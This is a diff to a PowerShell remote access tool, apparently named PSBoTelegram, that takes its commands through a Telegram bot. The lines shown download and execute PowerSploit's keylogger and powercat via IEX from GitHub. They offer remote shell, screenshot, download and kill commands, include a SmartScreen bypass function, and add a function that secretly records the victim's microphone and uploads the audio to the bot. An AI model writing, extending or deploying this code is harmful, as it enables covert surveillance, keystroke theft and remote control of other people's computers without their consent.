@@ -5,14 +5,6 @@ IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/
 $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
 
-function graba-audio { param ($botkey,$chat,$segundos)
-$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
-$audio = $ruta + "\" + "audio.wav"
-if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret"
-bot-send -file $audio -botkey $botkey -chat_id $chat_id
-Remove-Item $audio
-}
 
 function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
 function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }
@@ -133,7 +125,7 @@ Remove-Item $ruta
 }
 
 function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect,$help)
-
+ $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -148,4 +140,14 @@ function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect,$h
  if ($comando -like "/Audio*") {$comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
 
 
+}
+
+
+function graba-audio { param ($botkey,$chat,$segundos)
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
+$audio = $ruta + "\" + "audio.wav"
+if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
+bot-send -file $audio -botkey $botkey -chat_id $chat_id
+Remove-Item $audio
 }
